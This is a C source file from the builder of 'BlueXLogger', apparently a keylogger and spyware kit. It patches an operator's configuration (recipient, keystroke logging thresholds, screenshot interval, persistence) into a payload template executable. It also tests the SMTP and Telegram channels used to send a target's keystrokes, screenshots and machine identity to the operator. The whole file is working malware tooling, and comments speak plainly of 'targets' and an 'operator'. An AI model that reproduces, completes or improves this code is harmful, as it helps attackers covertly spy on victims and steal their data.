/*============================================================================
 * BlueXLogger - src/builder/actions.c
 * Profile load/save, test email, and the payload build itself.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * The build path deserves a note. BlueXBuilder does NOT invoke a compiler or
 * a linker. It copies the payload template, locates the fixed-size BXL_CFG
 * RCDATA slot, and overwrites exactly SizeofResource() bytes at the slot's
 * file offset. Because the slot never changes size, no resource directory,
 * section table or RVA is disturbed - see bxl_patch.c for the full algorithm.
 * That is why the builder works on a machine with no toolchain installed.
 *==========================================================================*/
#include "state.h"
#include "ui_theme.h"
#include "bxl_branding.h"
#include "bxl_patch.h"
#include "bxl_smtp.h"
#include "bxl_mime.h"
#include "bxl_identity.h"
#include "bxl_telegram.h"
#include "bxl_screenshot.h"
#include "bxl_resid.h"
#include <commdlg.h>

#pragma comment(lib, "comdlg32.lib")

/*----------------------------------------------------------------------------
 * Template resolution
 *--------------------------------------------------------------------------*/
int bld_template_path(wchar_t *out, size_t out_cch, wchar_t *err, size_t err_cch)
{
    wchar_t exe[MAX_PATH * 2];
    wchar_t dir[MAX_PATH * 2];
    wchar_t cand[MAX_PATH * 2];
    wchar_t *slash;

    /* A payload_template.exe next to the builder wins, so that a developer
     * can rebuild the payload and immediately test it without relinking the
     * builder (which would otherwise have to re-embed the new template). */
    if (bxl_path_exe(exe, BXL_COUNT_OF(exe))) {
        slash = wcsrchr(exe, L'\\');
        if (slash) *slash = 0;
        StringCchCopyW(dir, BXL_COUNT_OF(dir), exe);
        if (bxl_path_join(cand, BXL_COUNT_OF(cand), dir,
                          L"payload_template.exe") &&
            bxl_path_exists(cand)) {
            StringCchCopyW(out, out_cch, cand);
            return BXL_TRUE;
        }
    }

    /* Otherwise fall back to the copy embedded in this executable. */
    {
        HRSRC   hr;
        HGLOBAL hg;
        DWORD   n;
        const void *p;
        wchar_t tmp[MAX_PATH * 2];
        wchar_t tmpdir[MAX_PATH * 2];
        HANDLE  h;
        DWORD   wrote = 0;

        hr = FindResourceW(NULL, BXL_RES_TEMPLATE_W, RT_RCDATA);
        if (!hr) {
            if (err) StringCchCopyW(err, err_cch,
                L"This build of BlueXBuilder has no embedded payload template.");
            return BXL_FALSE;
        }
        hg = LoadResource(NULL, hr);
        n  = SizeofResource(NULL, hr);
        p  = hg ? LockResource(hg) : NULL;
        if (!p || !n) {
            if (err) StringCchCopyW(err, err_cch,
                L"The embedded payload template is empty or unreadable.");
            return BXL_FALSE;
        }

        if (!bxl_path_temp_dir(tmpdir, BXL_COUNT_OF(tmpdir))) {
            if (err) StringCchCopyW(err, err_cch, L"Cannot locate the temp folder.");
            return BXL_FALSE;
        }
        if (!bxl_path_join(tmp, BXL_COUNT_OF(tmp), tmpdir,
                           L"BlueXLogger_builder")) {
            if (err) StringCchCopyW(err, err_cch, L"Cannot build the template path.");
            return BXL_FALSE;
        }
        bxl_dir_create(tmp);

        if (!bxl_path_join(cand, BXL_COUNT_OF(cand), tmp,
                           L"payload_template.exe")) {
            if (err) StringCchCopyW(err, err_cch, L"Cannot build the template path.");
            return BXL_FALSE;
        }

        h = CreateFileW(cand, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            if (err) StringCchCopyW(err, err_cch,
                L"Cannot write the embedded template to the temp folder.");
            return BXL_FALSE;
        }
        if (!WriteFile(h, p, n, &wrote, NULL) || wrote != n) {
            CloseHandle(h);
            DeleteFileW(cand);
            if (err) StringCchCopyW(err, err_cch,
                L"Short write while unpacking the embedded template.");
            return BXL_FALSE;
        }
        CloseHandle(h);

        StringCchCopyW(out, out_cch, cand);
        return BXL_TRUE;
    }
}

/*----------------------------------------------------------------------------
 * Build
 *--------------------------------------------------------------------------*/
int bld_build(const BxlConfig *cfg, wchar_t *out_path, size_t out_cch,
              wchar_t *err, size_t err_cch)
{
    wchar_t tmpl[MAX_PATH * 2];
    wchar_t out[MAX_PATH * 2];
    char    aerr[512];
    BxlConfig back;

    if (err && err_cch) err[0] = 0;

    bld_log(L"--- build started ------------------------------------------");
    bld_log(L"%ls", BXL_WATERMARK_W);

    if (!bld_template_path(tmpl, BXL_COUNT_OF(tmpl), err, err_cch)) {
        bld_log(L"[build] FAILED: %ls", err ? err : L"no template");
        return BXL_FALSE;
    }
    bld_log(L"[build] template : %ls", tmpl);

    if (!bxl_path_join(out, BXL_COUNT_OF(out), bld_out_dir(), bld_out_name())) {
        if (err) StringCchCopyW(err, err_cch, L"Cannot compose the output path.");
        bld_log(L"[build] FAILED: cannot compose the output path");
        return BXL_FALSE;
    }
    bld_log(L"[build] output   : %ls", out);

    if (!bxl_dir_create(bld_out_dir()) && !bxl_path_exists(bld_out_dir())) {
        if (err) StringCchCopyW(err, err_cch,
            L"The output folder does not exist and could not be created.");
        bld_log(L"[build] FAILED: cannot create the output folder");
        return BXL_FALSE;
    }

    if (!bxl_patch_write(tmpl, out, cfg, aerr, sizeof(aerr))) {
        wchar_t werr[512];
        if (!bxl_utf8_to_wide(aerr, werr, BXL_COUNT_OF(werr))) werr[0] = 0;
        if (err) StringCchCopyW(err, err_cch, werr);
        bld_log(L"[build] FAILED: %ls", werr);
        return BXL_FALSE;
    }

    /* Read the configuration back out of the produced file. This is the real
     * proof that the patch landed where the payload will look for it. */
    if (bxl_patch_read(out, &back, aerr, sizeof(aerr))) {
        bld_log(L"[build] verified : embedded config reads back, CRC matches");
        bld_log(L"[build]           recipient=%hs log=%u min / %u keys",
                back.recipient, back.log_interval_min,
                back.log_keystroke_threshold);
        bld_log(L"[build]           shots=%hs every %u min, persistence=%hs",
                back.shot_enabled ? "on" : "off", back.shot_interval_min,
                back.persistence == BXL_PERSIST_OFF ? "off" : "configured");
    } else {
        wchar_t werr[512];
        if (!bxl_utf8_to_wide(aerr, werr, BXL_COUNT_OF(werr))) werr[0] = 0;
        bld_log(L"[build] WARNING: read-back failed: %ls", werr);
    }

    {
        int     found = 0, placeholder = 0;
        bxl_u32 size = 0;
        if (bxl_patch_inspect(out, &found, &size, &placeholder,
                              aerr, sizeof(aerr))) {
            bld_log(L"[build] slot     : found=%ls size=%u placeholder=%ls",
                    found ? L"yes" : L"no", (unsigned)size,
                    placeholder ? L"yes" : L"no");
        }
    }

    bld_log(L"[build] OK - wrote %ls (%llu bytes)", out,
            (unsigned long long)bxl_file_size(out));
    bld_log(L"--- build finished -----------------------------------------");

    if (out_path && out_cch) StringCchCopyW(out_path, out_cch, out);
    return BXL_TRUE;
}

/*----------------------------------------------------------------------------
 * Connection test
 *--------------------------------------------------------------------------*/
static const wchar_t *tls_mode_text(int mode)
{
    switch (mode) {
    case BXL_TLS_IMPLICIT: return L"implicit TLS";
    case BXL_TLS_STARTTLS: return L"STARTTLS";
    default:               return L"plaintext";
    }
}

int bld_test_connection(const BxlConfig *cfg, wchar_t *err, size_t err_cch)
{
    BxlSmtpConfig sc;
    BxlSmtpResult res;
    wchar_t       werr[512];

    if (err && err_cch) err[0] = 0;

    bxl_smtp_config_from(cfg, &sc);

    /* One attempt, not three: the operator is watching a dialog, and a
     * mistyped password would otherwise stall it for six seconds of backoff.
     * The stages below say exactly what went wrong, which is more useful here
     * than a retry. */
    sc.max_attempts  = 1;
    sc.retry_base_ms = 0;

    bld_log(L"--- connection test ----------------------------------------");
    bld_log(L"%ls", BXL_WATERMARK_W);
    /* sc.host is a narrow (char) buffer. In a wide printf that is %hs; using
     * %ls here reinterprets the ASCII bytes as UTF-16 and prints CJK garbage
     * such as "浳灴朮慭汩挮浯" for "smtp.gmail.com". */
    bld_log(L"[conn] host   : %hs:%u", sc.host, (unsigned)sc.port);
    bld_log(L"[conn] security: %ls", tls_mode_text(sc.tls_mode));
    bld_log(L"[conn] auth   : %ls", sc.auth ? L"AUTH LOGIN" : L"none");
    bld_log(L"[conn] user   : %hs", sc.user[0] ? sc.user : "(empty)");

    if (!sc.host[0]) {
        if (err) StringCchCopyW(err, err_cch, L"Set the SMTP host first.");
        bld_log(L"[conn] FAILED: no SMTP host");
        return BXL_FALSE;
    }
    if (sc.auth && (!sc.user[0] || !sc.password[0])) {
        if (err) StringCchCopyW(err, err_cch,
            L"Authentication is on, so both the sender address and the App "
            L"Password are required.");
        bld_log(L"[conn] FAILED: credentials incomplete");
        return BXL_FALSE;
    }

    if (!bxl_net_startup()) {
        if (err) StringCchCopyW(err, err_cch, L"Winsock could not start.");
        bld_log(L"[conn] FAILED: winsock startup");
        return BXL_FALSE;
    }

    if (!bxl_smtp_verify(&sc, &res)) {
        const char *reason = res.error[0] ? res.error : res.last_line;
        if (!bxl_utf8_to_wide(reason, werr, BXL_COUNT_OF(werr))) werr[0] = 0;

        bld_log(L"[conn] failed at stage: %ls", bxl_smtp_stage_name(res.stage));
        if (res.last_code > 0)
            bld_log(L"[conn] server reply: %d %hs", res.last_code,
                    res.last_line[0] ? res.last_line : "");
        bld_log(L"[conn] FAILED: %ls", werr);

        if (err) {
            StringCchPrintfW(err, err_cch,
                             L"Could not connect at the %ls stage.\r\n\r\n%ls",
                             bxl_smtp_stage_name(res.stage), werr);
        }
        bxl_net_cleanup();
        return BXL_FALSE;
    }

    bld_log(L"[conn] connected, TLS negotiated, credentials accepted");
    bld_log(L"[conn] server said: %hs", res.last_line);
    bld_log(L"[conn] OK in %u ms", (unsigned)res.elapsed_ms);
    bld_log(L"--- connection test finished -------------------------------");

    bxl_net_cleanup();
    return BXL_TRUE;
}

/*----------------------------------------------------------------------------
 * Test email
 *--------------------------------------------------------------------------*/
int bld_test_email(const BxlConfig *cfg, wchar_t *err, size_t err_cch)
{
    BxlSmtpConfig sc;
    BxlSmtpResult res;
    BxlMessage    msg;
    BxlIdentity   id;
    char          body[4096];
    wchar_t       werr[512];

    if (err && err_cch) err[0] = 0;

    bxl_smtp_config_from(cfg, &sc);

    /* The demo mail carries the same identity block as a real delivery, so the
     * operator sees exactly what a report from a target will look like. */
    bxl_identity_init(&id);

    memset(&msg, 0, sizeof(msg));
    StringCchCopyA(msg.from, sizeof(msg.from), cfg->sender);
    StringCchCopyA(msg.to, sizeof(msg.to), cfg->recipient);
    bxl_mime_make_subject(msg.subject, sizeof(msg.subject),
                          cfg->subject_prefix, &id, bxl_unix_time());
    StringCchCatA(msg.subject, sizeof(msg.subject), " - test message");
    msg.date_unix = bxl_unix_time();

    {
        static const char *note =
            "This is a test message from " BXL_BUILDER_NAME ".\r\n"
            "If you are reading it, the SMTP settings are correct.\r\n"
            BXL_WATERMARK "\r\n";
        bxl_mime_make_body(body, sizeof(body), &id, msg.date_unix,
                           note, strlen(note), 0);
    }
    msg.body_text     = body;
    msg.body_text_len = strlen(body);

    bld_log(L"[test] %hs:%u (%ls)", sc.host, (unsigned)sc.port,
            sc.tls_mode == BXL_TLS_IMPLICIT ? L"implicit TLS" :
            sc.tls_mode == BXL_TLS_STARTTLS ? L"STARTTLS" : L"plaintext");
    bld_log(L"[test] from %hs to %hs", sc.user, msg.to);

    if (!bxl_net_startup()) {
        if (err) StringCchCopyW(err, err_cch, L"Winsock could not start.");
        bld_log(L"[test] FAILED: winsock startup");
        return BXL_FALSE;
    }

    if (!bxl_smtp_send(&sc, &msg, &res)) {
        const char *reason = res.error[0] ? res.error : res.last_line;
        if (!bxl_utf8_to_wide(reason, werr, BXL_COUNT_OF(werr))) werr[0] = 0;
        if (err) StringCchCopyW(err, err_cch, werr);
        bld_log(L"[test] FAILED after %d attempt(s): %ls", res.attempts, werr);
        bxl_net_cleanup();
        return BXL_FALSE;
    }

    bld_log(L"[test] accepted after %d attempt(s) in %u ms",
            res.attempts, (unsigned)res.elapsed_ms);
    bld_log(L"[test] check the %hs inbox", msg.to);
    bxl_net_cleanup();
    return BXL_TRUE;
}

/*----------------------------------------------------------------------------
 * Telegram test
 *--------------------------------------------------------------------------*/
/* The token is printed redacted everywhere: a full bot token in the build log
 * is a full bot token in any screenshot of the builder. */
static void log_telegram_target(const BxlTelegramConfig *tc)
{
    char red[64];
    bxl_telegram_redact(tc->bot_token, red, sizeof(red));
    bld_log(L"[tg] token : %hs", red);
    bld_log(L"[tg] chat  : %hs", tc->chat_id[0] ? tc->chat_id : "(empty)");
}

int bld_test_telegram(const BxlConfig *cfg, wchar_t *err, size_t err_cch)
{
    BxlTelegramConfig tc;
    BxlTelegramResult res;
    wchar_t           werr[512];

    if (err && err_cch) err[0] = 0;

    bxl_telegram_config_from(cfg, &tc);
    tc.max_attempts  = 1;
    tc.retry_base_ms = 0;

    bld_log(L"--- telegram verify ----------------------------------------");
    bld_log(L"%ls", BXL_WATERMARK_W);
    log_telegram_target(&tc);

    if (!bxl_telegram_token_ok(tc.bot_token)) {
        if (err) StringCchCopyW(err, err_cch,
            L"Paste the bot token from @BotFather - it looks like 123456789:AAH...");
        bld_log(L"[tg] FAILED: the token does not look like a bot token");
        return BXL_FALSE;
    }

    if (!bxl_net_startup()) {
        if (err) StringCchCopyW(err, err_cch, L"Winsock could not start.");
        bld_log(L"[tg] FAILED: winsock startup");
        return BXL_FALSE;
    }

    if (!bxl_telegram_verify(&tc, &res)) {
        const char *reason = res.error[0] ? res.error : res.last_line;
        if (!bxl_utf8_to_wide(reason, werr, BXL_COUNT_OF(werr))) werr[0] = 0;

        bld_log(L"[tg] failed at stage: %ls", bxl_telegram_stage_name(res.stage));
        if (res.http_status) bld_log(L"[tg] http status: %d", res.http_status);
        if (res.api_code)    bld_log(L"[tg] api code   : %d", res.api_code);
        bld_log(L"[tg] FAILED: %ls", werr);

        if (err) {
            StringCchPrintfW(err, err_cch,
                             L"Could not verify the bot at the %ls stage.\r\n\r\n%ls",
                             bxl_telegram_stage_name(res.stage), werr);
        }
        bxl_net_cleanup();
        return BXL_FALSE;
    }

    bld_log(L"[tg] OK in %u ms - the token is valid and api.telegram.org is reachable",
            (unsigned)res.elapsed_ms);
    bld_log(L"[tg] nothing was posted to the chat");
    bld_log(L"--- telegram verify finished -------------------------------");
    bxl_net_cleanup();
    return BXL_TRUE;
}

int bld_test_telegram_demo(const BxlConfig *cfg, wchar_t *err, size_t err_cch)
{
    BxlTelegramConfig tc;
    BxlTelegramResult res;
    BxlIdentity       id;
    BxlTgFile         files[1];
    size_t            file_count = 0;
    BxlShot           shot;
    int               shot_ready = 0;
    char              text[4096];
    char              block[1024];
    wchar_t           werr[512];

    if (err && err_cch) err[0] = 0;

    bxl_telegram_config_from(cfg, &tc);
    tc.max_attempts  = 1;
    tc.retry_base_ms = 0;

    memset(&shot, 0, sizeof(shot));
    memset(files, 0, sizeof(files));

    bld_log(L"--- telegram demo ------------------------------------------");
    bld_log(L"%ls", BXL_WATERMARK_W);
    log_telegram_target(&tc);

    if (!bxl_telegram_token_ok(tc.bot_token)) {
        if (err) StringCchCopyW(err, err_cch,
            L"Paste the bot token from @BotFather - it looks like 123456789:AAH...");
        bld_log(L"[tg] FAILED: the token does not look like a bot token");
        return BXL_FALSE;
    }
    if (!bxl_telegram_chat_ok(tc.chat_id)) {
        if (err) StringCchCopyW(err, err_cch,
            L"Enter a numeric chat id (e.g. -1001234567890) or @channelname.");
        bld_log(L"[tg] FAILED: no usable chat id");
        return BXL_FALSE;
    }

    /* The demo mirrors a real delivery, so the identity block the operator
     * sees here is exactly the one a target's report will carry. */
    bxl_identity_init(&id);
    bxl_identity_resolve_public(&id, 2500);
    bxl_identity_block(&id, block, sizeof(block));

    StringCchPrintfA(text, sizeof(text),
                     "%s\r\n"
                     "This is a test message from " BXL_BUILDER_NAME ".\r\n"
                     "If you are reading this, the bot token and chat id are correct.\r\n"
                     BXL_WATERMARK "\r\n",
                     block);

    /* One screenshot when the operator asked for them, so the demo also proves
     * the image path and shows the caption format. */
    if (tc.send_screenshots) {
        BxlShotOptions so;
        bxl_screenshot_options_from(cfg, &so);
        if (bxl_screenshot_init() &&
            bxl_screenshot_capture(&so, id.hostname, &shot)) {
            bxl_str_copy(files[0].filename, sizeof(files[0].filename), shot.filename);
            bxl_str_copy(files[0].mime, sizeof(files[0].mime), shot.mime_type);
            files[0].data = shot.data;
            files[0].len  = shot.len;
            file_count    = 1;
            shot_ready    = 1;
            bld_log(L"[tg] screenshot: %hs (%llu bytes)",
                    shot.filename, (unsigned long long)shot.len);
        } else {
            bld_log(L"[tg] screenshot: unavailable, sending text only");
        }
    }

    if (!bxl_net_startup()) {
        if (shot_ready) bxl_shot_free(&shot);
        if (err) StringCchCopyW(err, err_cch, L"Winsock could not start.");
        bld_log(L"[tg] FAILED: winsock startup");
        return BXL_FALSE;
    }

    if (!bxl_telegram_send_digest(&tc, "BlueXLogger test message", text,
                                  file_count ? files : NULL, file_count, &res)) {
        const char *reason = res.error[0] ? res.error : res.last_line;
        if (!bxl_utf8_to_wide(reason, werr, BXL_COUNT_OF(werr))) werr[0] = 0;

        bld_log(L"[tg] failed at stage: %ls", bxl_telegram_stage_name(res.stage));
        if (res.http_status) bld_log(L"[tg] http status: %d", res.http_status);
        if (res.api_code)    bld_log(L"[tg] api code   : %d", res.api_code);
        if (res.retry_after) bld_log(L"[tg] retry after: %d s", res.retry_after);
        bld_log(L"[tg] FAILED: %ls", werr);

        if (err) {
            StringCchPrintfW(err, err_cch,
                             L"Telegram rejected the message at the %ls stage.\r\n\r\n%ls",
                             bxl_telegram_stage_name(res.stage), werr);
        }
        bxl_net_cleanup();
        if (shot_ready) bxl_shot_free(&shot);
        return BXL_FALSE;
    }

    bld_log(L"[tg] delivered in %u ms (%d attempt(s))",
            (unsigned)res.elapsed_ms, res.attempts);
    bld_log(L"[tg] open the chat to confirm the digest and its formatting");
    bld_log(L"--- telegram demo finished ---------------------------------");

    bxl_net_cleanup();
    if (shot_ready) bxl_shot_free(&shot);
    return BXL_TRUE;
}

/*----------------------------------------------------------------------------
 * Profiles
 *--------------------------------------------------------------------------*/
static int profile_dialog(wchar_t *path, size_t path_cch, int save)
{
    OPENFILENAMEW ofn;
    static const wchar_t filter[] =
        L"BlueXLogger profile (*.bxprofile)\0*.bxprofile\0"
        L"All files (*.*)\0*.*\0\0";

    memset(&ofn, 0, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner   = GetActiveWindow();
    ofn.lpstrFilter = filter;
    ofn.lpstrFile   = path;
    ofn.nMaxFile    = (DWORD)path_cch;
    ofn.lpstrDefExt = L"bxprofile";
    ofn.lpstrTitle  = save ? L"Save BlueXLogger profile"
                           : L"Load BlueXLogger profile";
    ofn.Flags       = save ? (OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST |
                              OFN_NOCHANGEDIR)
                           : (OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST |
                              OFN_NOCHANGEDIR);

    path[0] = 0;
    return save ? GetSaveFileNameW(&ofn) : GetOpenFileNameW(&ofn);
}

int bld_profile_save(const BxlConfig *cfg, wchar_t *err, size_t err_cch)
{
    wchar_t       path[MAX_PATH * 2];
    unsigned char blob[BXL_CFG_SLOT_SIZE];
    size_t        n;
    HANDLE        h;
    DWORD         wrote = 0;

    if (err && err_cch) err[0] = 0;
    if (!profile_dialog(path, BXL_COUNT_OF(path), 1)) return BXL_FALSE;

    n = bxl_config_serialize(cfg, blob, sizeof(blob));
    if (!n) {
        if (err) StringCchCopyW(err, err_cch, L"Could not serialize the configuration.");
        return BXL_FALSE;
    }

    h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        if (err) StringCchCopyW(err, err_cch, L"Could not create the profile file.");
        return BXL_FALSE;
    }
    if (!WriteFile(h, blob, (DWORD)n, &wrote, NULL) || wrote != n) {
        CloseHandle(h);
        if (err) StringCchCopyW(err, err_cch, L"Could not write the profile file.");
        return BXL_FALSE;
    }
    CloseHandle(h);
    return BXL_TRUE;
}

int bld_profile_load(BxlConfig *cfg, wchar_t *err, size_t err_cch)
{
    wchar_t       path[MAX_PATH * 2];
    unsigned char blob[BXL_CFG_SLOT_SIZE];
    HANDLE        h;
    DWORD         got = 0;

    if (err && err_cch) err[0] = 0;
    if (!profile_dialog(path, BXL_COUNT_OF(path), 0)) return BXL_FALSE;

    h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        if (err) StringCchCopyW(err, err_cch, L"Could not open the profile file.");
        return BXL_FALSE;
    }
    if (!ReadFile(h, blob, sizeof(blob), &got, NULL) || got < BXL_CFG_HEADER_LEN) {
        CloseHandle(h);
        if (err) StringCchCopyW(err, err_cch, L"The profile file is too small to be valid.");
        return BXL_FALSE;
    }
    CloseHandle(h);

    if (!bxl_config_deserialize(blob, got, cfg)) {
        if (err) StringCchCopyW(err, err_cch,
            L"The profile is corrupt or was written by a different version.");
        return BXL_FALSE;
    }
    return BXL_TRUE;
}
